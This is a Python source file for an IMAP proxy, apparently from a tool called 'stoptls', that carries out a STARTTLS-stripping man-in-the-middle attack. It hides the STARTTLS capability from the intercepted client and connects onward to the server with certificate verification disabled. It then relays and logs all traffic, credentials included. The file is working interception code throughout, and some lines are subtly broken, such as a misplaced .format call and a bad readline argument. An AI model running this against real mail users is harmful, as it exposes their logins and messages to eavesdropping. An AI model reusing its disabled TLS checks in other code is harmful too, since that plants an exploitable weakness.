import asyncio
import logging
import socket
import ssl

from stoptls.tcp.base import TCPProxy
from stoptls.tcp import regex


class IMAPProxy(TCPProxy):
    def __init__(self):
        super().__init__()

    async def strip(self, client_reader, client_writer):
        dst_address, dst_port = self.get_orig_dst_socket(client_writer)
        logging.debug('Original destination: {}'.format(dst_address))
        server_reader, server_writer = await asyncio.open_connection(dst_address,
                                                                     dst_port)
        banner = await server_reader.readline()
        logging.debug('Received banner: {}'.format(banner))

        banner = banner.decode('ascii')
        banner_re = regex.IMAP_RESPONSE.fullmatch(banner)

        if banner_re and \
           banner_re.group('response') and \
           regex.STARTTLS.search(banner_re.group('response')):
            banner = regex.IMAP_STARTTLS.sub('', banner_re.group(0))
            server_writer.write(b'asdf STARTTLS\n')
            await server_writer.drain()

            tls_started = await server_reader.readline()
            logging.debug('Received data from server: {}'.format(tls_started))
            tls_started_re = regex.IMAP_RESPONSE.fullmatch(tls_started.decode('ascii'))

            if tls_started_re and tls_started_re.group('ok'):
                sc = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                sc.check_hostname = False
                sc.verify_mode = ssl.CERT_NONE

                nameinfo = await asyncio.get_running_loop()\
                                        .getnameinfo((dst_address,
                                                      dst_port),
                                                     socket.NI_NAMEREQD)
                server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
                                                                             ssl=sc,
                                                                             server_hostname=nameinfo[0])
                logging.debug('Sucessfully upgraded to TLS!')
            else:
                logging.debug('Failed to upgraded to TLS')
        else:
            # It's possible that STARTTLS, among other CAPABILITYs - wasn't
            # included in the IMAP banner. In this case, we issue the
            # CAPABILITY command. If STARTTLS is indeed a capability, then we
            # upgrade the connection
            server_writer.write(b'asdf CAPABILITY\n')
            await server_writer.drain()

            tls_supported = await server_reader.readline('\n')
            logging.debug('Received data from server:{}').format(tls_supported)
            tls_supported_re = regex.IMAP_RESPONSE.fullmatch(tls_supported.decode('ascii'))

            if tls_supported_re and \
               tls_supported_re.group('response') and \
               regex.STARTTLS.search(tls_supported_re.group('response')):
                server_writer.write(b'asdf STARTTLS\n')
                await server_writer.drain()

                tls_started = await server_reader.readline()
                logging.debug('Received data from server: {}'.format(tls_started))
                tls_started_re = regex.IMAP_RESPONSE.fullmatch(tls_started.decode('ascii'))

                if tls_started_re and tls_started_re.group('ok'):
                    sc = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                    sc.check_hostname = False
                    sc.verify_mode = ssl.CERT_NONE

                    nameinfo = await asyncio.get_running_loop()\
                                            .getnameinfo((dst_address,
                                                          dst_port),
                                                         socket.NI_NAMEREQD)
                    server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
                                                                                 ssl=sc,
                                                                                 server_hostname=nameinfo[0])
                    logging.debug('Sucessfully upgraded to TLS!')
                else:
                    logging.debug('Failed to upgraded to TLS')

        client_writer.write(banner.encode('ascii'))
        logging.debug('Writing banner to client...')
        await client_writer.drain()

        while not server_reader.at_eof():
            client_data = await client_reader.readline()
            logging.debug('Received client data: {}'.format(client_data))

            if client_reader.at_eof():
                logging.debug('Client closed connection')
                break

            try:
                server_writer.write(client_data)
                logging.debug('Writing client data to server...')
                await server_writer.drain()
            except ConnectionResetError:
                break

            while True:
                logging.debug('Reading from server...')
                server_data = await server_reader.readline()

                logging.debug('Received server data: {}'.format(server_data))

                client_writer.write(server_data)
                logging.debug('Writing server data to client...')
                await client_writer.drain()

                server_data_re = regex.IMAP_RESPONSE.fullmatch(server_data.decode('ascii'))

                if server_data_re.group('tag') != '*' or \
                   server_data_re.group('bad'):
                    break

        server_writer.close()
        client_writer.close()
        logging.debug('Connections closed')
